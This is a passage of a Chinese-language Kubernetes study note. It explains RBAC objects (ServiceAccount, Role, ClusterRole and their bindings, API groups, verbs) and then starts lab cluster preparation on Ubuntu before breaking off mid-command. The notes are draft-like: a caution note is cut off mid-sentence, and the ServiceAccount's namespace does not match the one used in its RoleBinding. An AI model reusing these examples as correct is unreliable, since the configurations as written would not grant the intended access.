id="14-3-1-创建-Service-Account"><a href="#14-3-1-创建-Service-Account" class="headerlink" title="14.3.1. 创建 Service Account"></a>14.3.1. 创建 Service Account</h5><p>&#x3D;&#x3D;1.编写 Service Account 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> ServiceAccount<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> my-service-account            <span class="hljs-meta"># Service Account 名称</span><br><span class="hljs-symbol">  namespace:</span> default                  <span class="hljs-meta"># Service Account 的 namespace</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">必须指定 namespace</font>：<ul><li>因为使用 Pod 指定 Service Account，会去找 Pod 所在的 namespace 中的 Service Account</li></ul></li></ol></blockquote><p>&#x3D;&#x3D;2.创建 Service Account 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f service-account.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.查看 Service Account 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> serviceaccount<br></code></pre></td></tr></table></figure><hr><h5 id="14-3-2-使用-Role-RoleBinding-为-Service-Accoount-授权"><a href="#14-3-2-使用-Role-RoleBinding-为-Service-Accoount-授权" class="headerlink" title="14.3.2. 使用 Role + RoleBinding 为 Service Accoount 授权"></a>14.3.2. 使用 Role + RoleBinding 为 Service Accoount 授权</h5><p>&#x3D;&#x3D;1.编写 Role 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Role<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-reader<br>  <span class="hljs-params">namespace:</span> frontend                     <span class="hljs-comment"># 指定作用的命名空间</span><br><span class="hljs-params">rules:</span>                                    <span class="hljs-comment"># 权限规则</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]                       <span class="hljs-comment"># API 组（&quot;&quot; 表示核心资源，如 Pod、Service）</span><br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]                   <span class="hljs-comment"># 资源名称</span><br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]                <span class="hljs-comment"># 操作权限</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 Role 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f role.yaml               # 使用 <span class="hljs-built_in">apply</span> 创建 Role<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Role 资源状态&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kubectl <span class="hljs-keyword">get</span> <span class="hljs-keyword">role</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.编写 RoleBinding 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> RoleBinding<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> my-service-account-pod-reader<br>  <span class="hljs-params">namespace:</span> frontend                      <span class="hljs-comment"># 指定作用的命名空间</span><br><span class="hljs-params">subjects:</span>                                  <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> ServiceAccount                   <span class="hljs-comment"># 类型：ServiceAccount</span><br>    <span class="hljs-params">name:</span> my-service-account               <span class="hljs-comment"># 授权给 my-service-account ServiceAccount</span><br>    <span class="hljs-params">namespace:</span> frontend                    <span class="hljs-comment"># 确保指定正确的命名空间</span><br><span class="hljs-params">roleRef:</span>                                   <span class="hljs-comment"># 引用已有的 Role</span><br>  <span class="hljs-params">kind:</span> Role                               <span class="hljs-comment"># 引用角色的类型</span><br>  <span class="hljs-params">name:</span> pod-reader                         <span class="hljs-comment"># 引用的 Role 名称（需已存在）</span><br>  <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io      <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>不要将 Service Account 的namespace 和</li></ol></blockquote><p>&#x3D;&#x3D;5.创建 RoleBinding 资源状态&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f rolebinding.yaml          # 使用 <span class="hljs-built_in">apply</span> 创建 RoleBinding<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.检查 RoleBinding 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> rolebinding<br></code></pre></td></tr></table></figure><hr><h6 id="14-3-2-1-使用-ClusterRole-ClusterRoleBinding-为-Service-Account-授权"><a href="#14-3-2-1-使用-ClusterRole-ClusterRoleBinding-为-Service-Account-授权" class="headerlink" title="14.3.2.1. 使用 ClusterRole + ClusterRoleBinding 为 Service Account 授权"></a>14.3.2.1. 使用 ClusterRole + ClusterRoleBinding 为 Service Account 授权</h6><p>&#x3D;&#x3D;1.编写 ClusterRole 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ClusterRole<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-reader                            <span class="hljs-comment"># 指定角色名称</span><br><span class="hljs-params">rules:</span>                                        <span class="hljs-comment"># 权限规则</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]                           <span class="hljs-comment"># API 组（&quot;&quot; 表示核心资源，如 Pod、Service）</span><br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]                       <span class="hljs-comment"># 资源名称</span><br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]                    <span class="hljs-comment"># 操作权限</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 ClusterRole 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f clusterrole.yaml             # 使用 <span class="hljs-built_in">apply</span> 创建 ClusterRole<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 ClusterRole 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> clusterrole<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.编写 ClusterRoleBinding 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ClusterRoleBinding<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-reader-binding-to-sa                <span class="hljs-comment"># 绑定名称</span><br><span class="hljs-params">subjects:</span>                                       <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> ServiceAccount                        <span class="hljs-comment"># 类型：ServiceAccount</span><br>    <span class="hljs-params">name:</span> my-service-account                    <span class="hljs-comment"># 授权给 my-service-account</span><br>    <span class="hljs-params">namespace:</span> default                          <span class="hljs-comment"># 指定 ServiceAccount 所在的命名空间</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io         <span class="hljs-comment"># 指定 RBAC API 组</span><br><span class="hljs-params">roleRef:</span>                                        <span class="hljs-comment"># 引用已有的 ClusterRole</span><br>  <span class="hljs-params">kind:</span> ClusterRole                             <span class="hljs-comment"># 引用角色的类型</span><br>  <span class="hljs-params">name:</span> pod-reader                              <span class="hljs-comment"># 引用的 ClusterRole 名称（需已存在）</span><br>  <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io           <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.创建 ClusterRoleBinding 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f clusterrolebinding.yaml    # 使用 <span class="hljs-built_in">apply</span> 创建 ClusterRoleBinding<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.检查 ClusterRoleBinding 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span> clusterrolebinding<br></code></pre></td></tr></table></figure><hr><h4 id="14-4-补充：Role-资源的写法"><a href="#14-4-补充：Role-资源的写法" class="headerlink" title="14.4. 补充：Role 资源的写法"></a>14.4. 补充：Role 资源的写法</h4><h5 id="14-4-1-Role-资源的写法"><a href="#14-4-1-Role-资源的写法" class="headerlink" title="14.4.1. Role 资源的写法"></a>14.4.1. Role 资源的写法</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Role<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> pod-reader<br>  <span class="hljs-params">namespace:</span> frontend                     <span class="hljs-comment"># 指定作用的命名空间</span><br><span class="hljs-params">rules:</span>                                    <span class="hljs-comment"># 权限规则</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]                       <span class="hljs-comment"># API 组（&quot;&quot; 表示核心资源，如 Pod、Service）</span><br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]                   <span class="hljs-comment"># 资源名称</span><br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]                <span class="hljs-comment"># 操作权限</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>namespace</code> 必须指定，并且要与 <code>RoleBinding</code> 的命名空间一致。这样，当我们使用 <code>RoleBinding</code> 将 <code>Role</code> 绑定到用户、用户组或 ServiceAccount 后，该用户在执行 <code>kubectl</code> 命令时，就能操作该命名空间下的资源。</li></ol></blockquote><hr><h5 id="14-4-2-API-组（apiGroups）和资源名称（resources）"><a href="#14-4-2-API-组（apiGroups）和资源名称（resources）" class="headerlink" title="14.4.2. API 组（apiGroups）和资源名称（resources）"></a>14.4.2. API 组（apiGroups）和资源名称（resources）</h5><p>&#x3D;&#x3D;1.所有资源组（apiGroups: “ * “）&#x3D;&#x3D;</p><p>&#x3D;&#x3D;2.核心资源组（apiGroup: “”）&#x3D;&#x3D;</p><table><thead><tr><th>资源名称</th><th>描述</th></tr></thead><tbody><tr><td><code>pods</code></td><td>Pod 资源</td></tr><tr><td><code>services</code></td><td>Service 资源</td></tr><tr><td><code>endpoints</code></td><td>Service 的 Endpoint 信息</td></tr><tr><td><code>namespaces</code></td><td>命名空间</td></tr><tr><td><code>configmaps</code></td><td>ConfigMap 配置项</td></tr><tr><td><code>secrets</code></td><td>Secret 密钥</td></tr><tr><td><code>persistentvolumeclaims</code></td><td>PVC（持久卷声明）</td></tr><tr><td><code>persistentvolumes</code></td><td>PV（持久卷）</td></tr><tr><td><code>events</code></td><td>事件信息</td></tr><tr><td><code>nodes</code></td><td>节点信息</td></tr><tr><td><code>replicationcontrollers</code></td><td>副本控制器（RC）</td></tr><tr><td><code>serviceaccounts</code></td><td>ServiceAccount 服务账号</td></tr><tr><td><code>bindings</code></td><td>调度绑定信息</td></tr><tr><td><code>limitranges</code></td><td>限制范围</td></tr><tr><td><code>resourcequotas</code></td><td>资源配额</td></tr></tbody></table><p>&#x3D;&#x3D;3.工作负载组（apiGroup: “apps”）&#x3D;&#x3D;</p><table><thead><tr><th>资源名称</th><th>描述</th></tr></thead><tbody><tr><td><code>deployments</code></td><td>Deployment 部署</td></tr><tr><td><code>daemonsets</code></td><td>DaemonSet 守护进程集</td></tr><tr><td><code>statefulsets</code></td><td>StatefulSet 有状态副本集</td></tr><tr><td><code>replicasets</code></td><td>ReplicaSet 副本集</td></tr><tr><td><code>controllerrevisions</code></td><td>控制器修订版本信息</td></tr></tbody></table><p>&#x3D;&#x3D;4.批处理资源组（apiGroup: “batch”）&#x3D;&#x3D;</p><table><thead><tr><th>资源名称</th><th>描述</th></tr></thead><tbody><tr><td><code>jobs</code></td><td>Job 任务</td></tr><tr><td><code>cronjobs</code></td><td>CronJob 定时任务</td></tr></tbody></table><p>&#x3D;&#x3D;5.RBAC 权限资源组（apiGroup: “rbac.authorization.k8s.io”）&#x3D;&#x3D;</p><table><thead><tr><th>资源名称</th><th>描述</th></tr></thead><tbody><tr><td><code>roles</code></td><td>Role 角色</td></tr><tr><td><code>rolebindings</code></td><td>RoleBinding 角色绑定</td></tr><tr><td><code>clusterroles</code></td><td>ClusterRole 集群角色</td></tr><tr><td><code>clusterrolebindings</code></td><td>ClusterRoleBinding 集群绑定</td></tr></tbody></table><p>&#x3D;&#x3D;6.自定义资源（CRD）组（apiGroup: “apiextensions.k8s.io”）&#x3D;&#x3D;</p><table><thead><tr><th>资源名称</th><th>描述</th></tr></thead><tbody><tr><td><code>customresourcedefinitions</code></td><td>自定义资源定义（CRD）</td></tr></tbody></table><p>&#x3D;&#x3D;7.其他常见资源组&#x3D;&#x3D;</p><table><thead><tr><th>API 组</th><th>资源名称</th><th>描述</th></tr></thead><tbody><tr><td><code>autoscaling</code></td><td><code>horizontalpodautoscalers</code></td><td>HPA 自动扩缩容</td></tr><tr><td><code>networking.k8s.io</code></td><td><code>networkpolicies</code></td><td>网络策略</td></tr><tr><td><code>storage.k8s.io</code></td><td><code>storageclasses</code></td><td>存储类</td></tr><tr><td><code>metrics.k8s.io</code></td><td><code>pods</code>, <code>nodes</code></td><td>指标（Pod、Node）</td></tr></tbody></table><hr><h5 id="14-4-3-操作权限（verbs）"><a href="#14-4-3-操作权限（verbs）" class="headerlink" title="14.4.3. 操作权限（verbs）"></a>14.4.3. 操作权限（verbs）</h5><p><code>verbs</code> 指定用户对资源的操作权限，包括：</p><ul><li><code>*</code> -&gt; 所有权限</li><li><code>get</code> → 获取资源信息。</li><li><code>list</code> → 列出资源列表。</li><li><code>watch</code> → 监听资源变化。</li><li><code>create</code> → 创建资源。</li><li><code>update</code> → 修改资源。</li><li><code>patch</code> → 部分修改资源。</li><li><code>delete</code> → 删除资源。</li><li><code>deletecollection</code> → 批量删除资源。</li><li><code>impersonate</code> → 模拟其他用户执行操作。</li><li><code>use</code> → 使用指定资源。</li><li><code>bind</code> → 将角色绑定到用户或组。</li></ul><hr><h4 id="14-5-补充：RoleBinding-资源的写法"><a href="#14-5-补充：RoleBinding-资源的写法" class="headerlink" title="14.5. 补充：RoleBinding 资源的写法"></a>14.5. 补充：RoleBinding 资源的写法</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> RoleBinding<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> alice-pod-reader<br>  <span class="hljs-params">namespace:</span> frontend                      <span class="hljs-comment"># 指定作用的命名空间</span><br><span class="hljs-params">subjects:</span>                                  <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> User                             <span class="hljs-comment"># 类型：用户</span><br>    <span class="hljs-params">name:</span> alice                            <span class="hljs-comment"># 授权给 alice 用户（与 kubeconfig 中的 CN 一致）</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io    <span class="hljs-comment"># 指定 RBAC API 组</span><br><span class="hljs-params">roleRef:</span>                                   <span class="hljs-comment"># 引用已有的 Role</span><br>  <span class="hljs-params">kind:</span> Role                               <span class="hljs-comment"># 引用角色的类型</span><br>  <span class="hljs-params">name:</span> pod-reader                         <span class="hljs-comment"># 引用的 Role 名称（需已存在）</span><br>  <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io      <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li><font color="#00b0f0">apiGroup</font>：<ul><li>Kubernetes 中可能存在多种授权模型（如 ABAC、RBAC 等），这里的 <code>apiGroup: rbac.authorization.k8s.io</code> 是为了明确告诉 Kubernetes：我要绑定 RBAC 模型下的角色。</li></ul></li><li><font color="#00b0f0">subjects.kind</font>：<ul><li><font color="#7030a0">User</font>：授权给用户</li><li><font color="#7030a0">Group</font>：授权给用户组</li><li><font color="#7030a0">ServiceAccount</font>：授权给 Service Account</li></ul></li><li><font color="#00b0f0">roleRef.apiGroup</font>：<ul><li><font color="#7030a0">Role</font>：单个命名空间下的权限配置</li><li><font color="#7030a0">ClusterRole</font>：全集群范围下的权限配置</li></ul></li></ol></blockquote><hr><h4 id="14-6-补充：ClusterRole-资源的写法"><a href="#14-6-补充：ClusterRole-资源的写法" class="headerlink" title="14.6. 补充：ClusterRole 资源的写法"></a>14.6. 补充：ClusterRole 资源的写法</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ClusterRole<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> cluster-pod-reader<br><span class="hljs-params">rules:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;&quot;</span>]<br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;pods&quot;</span>]<br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>]<br>  <span class="hljs-operator">-</span> <span class="hljs-params">apiGroups:</span> [<span class="hljs-string">&quot;apps&quot;</span>]<br>    <span class="hljs-params">resources:</span> [<span class="hljs-string">&quot;deployments&quot;</span>, <span class="hljs-string">&quot;statefulsets&quot;</span>]<br>    <span class="hljs-params">verbs:</span> [<span class="hljs-string">&quot;get&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>]<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>无需指定 <code>namespace</code>，因为 <code>ClusterRole</code> 是集群级别的角色，作用于全集群和所有命名空间。</li></ol></blockquote><hr><h4 id="14-7-补充：ClusterRoleBinding-资源的写法"><a href="#14-7-补充：ClusterRoleBinding-资源的写法" class="headerlink" title="14.7. 补充：ClusterRoleBinding 资源的写法"></a>14.7. 补充：ClusterRoleBinding 资源的写法</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> rbac.authorization.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> ClusterRoleBinding<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> alice-cluster-admin<br><span class="hljs-params">subjects:</span>                                 <span class="hljs-comment"># 授权的用户、组或 ServiceAccount</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">kind:</span> User                            <span class="hljs-comment"># 类型：用户</span><br>    <span class="hljs-params">name:</span> alice                           <span class="hljs-comment"># 授权给 alice 用户（与 kubeconfig 中的 CN 一致）</span><br>    <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io   <span class="hljs-comment"># 指定 RBAC API 组</span><br><span class="hljs-params">roleRef:</span>                                  <span class="hljs-comment"># 引用已有的 ClusterRole</span><br>  <span class="hljs-params">kind:</span> ClusterRole                       <span class="hljs-comment"># 引用角色的类型</span><br>  <span class="hljs-params">name:</span> cluster-admin                     <span class="hljs-comment"># 引用的 ClusterRole 名称（必须已经存在）</span><br>  <span class="hljs-params">apiGroup:</span> rbac.authorization.k8s.io     <span class="hljs-comment"># 指定 RBAC API 组</span><br></code></pre></td></tr></table></figure><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><h4 id="1-1-节点规划"><a href="#1-1-节点规划" class="headerlink" title="1.1. 节点规划"></a>1.1. 节点规划</h4><table><thead><tr><th>IP</th><th>主机名</th><th>硬件要求</th></tr></thead><tbody><tr><td>192.168.136.8</td><td>k8s-master1</td><td>内存：2GB、CPU：2、硬盘：30GB</td></tr><tr><td>192.168.136.9</td><td>k8s-master2</td><td>内存：2GB、CPU：2、硬盘：30GB</td></tr><tr><td>192.168.136.10</td><td>k8s-worker1</td><td>内存：2GB、CPU：2、硬盘：30GB</td></tr><tr><td>192.168.136.11</td><td>k8s-worker2</td><td>内存：2GB、CPU：2、硬盘：30GB</td></tr><tr><td>192.168.136.53</td><td>bind-dns</td><td></td></tr><tr><td>192.168.136.12</td><td>keepalived1</td><td></td></tr><tr><td>192.168.136.13</td><td>keepalived2</td><td></td></tr><tr><td>192.168.136.14</td><td>haproxy1</td><td></td></tr><tr><td>192.168.136.15</td><td>haproxy2</td><td></td></tr></tbody></table><hr><h4 id="1-2-软件版本"><a href="#1-2-软件版本" class="headerlink" title="1.2. 软件版本"></a>1.2. 软件版本</h4><table><thead><tr><th>名称</th><th>版本</th></tr></thead><tbody><tr><td><strong>Ubuntu</strong></td><td>24.04</td></tr><tr><td><strong>Containerd</strong></td><td>1.7.22</td></tr><tr><td><strong>Kubeadm</strong></td><td>1.28.2</td></tr><tr><td><strong>Kubelet</strong></td><td>1.28.2</td></tr><tr><td><strong>kubectl</strong></td><td>1.28.2</td></tr><tr><td><strong>Kubernetes</strong></td><td>1.28.2</td></tr><tr><td><strong>Calico</strong></td><td>3.28.2</td></tr></tbody></table><blockquote><p>[!NOTE] 注意事项</p><ol><li>Kubeadm 和 Kubernetes 的版本最好一致</li></ol></blockquote><hr><h4 id="1-3-K8S-节点环境准备"><a href="#1-3-K8S-节点环境准备" class="headerlink" title="1.3. K8S 节点环境准备"></a>1.3. K8S 节点环境准备</h4><p>&#x3D;&#x3D;1.修改主机名&#x3D;&#x3D;</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">k8s-master1</span>        <span class="hljs-comment"># 根据上表配置主机名</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.编辑本地名称解析文件&#x3D;&#x3D;</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"># <span class="hljs-number">1</span>. 编辑文件<br>sudo vim /etc/hosts<br><br><br># <span class="hljs-number">2</span>. 添加内容  之类的？<br><span class="hljs-number">127.0.0.1</span> localhost xxxxx<br><span class="hljs-number">192.168.136.100</span> k8s-vip<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.关闭防火墙&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">disable</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.关闭 Swap 分区&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> swapoff -a &amp;&amp; <span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;/swap/s/^/#/&#x27;</span> /etc/fstab<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;7.配置内核转发&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | sudo tee /etc/modules-load.d/k8s.conf </span><br><span class="hljs-string">overlay</span><br><span class="hljs-string">br_netfilter</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">sudo</span> modprobe overlay &amp;&amp; <span class="hljs-built_in">sudo</span> modprobe br_netfilter<br><br><span class="hljs-comment"># 查看是否加载</span><br>lsmod | grep br_netfilter<br><br><span class="hljs-comment"># 示例输出</span><br>user@k8s-master1:~$ lsmod | grep br_netfilter<br>br_netfilter           32768  0<br>bridge                421888  1 br_netfilter<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;8.配置网桥过滤&#x3D;&#x3D;</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.<span class="hljs-keyword">conf</span><br>net.bridge.bridge-nf-<span class="hljs-keyword">call</span>-ip6tables = <span class="hljs-number">1</span><br>net.bridge.bridge-nf-<span class="hljs-keyword">call</span>-iptables = <span class="hljs-number">1</span><br>net.ipv4.ip_forward = <span 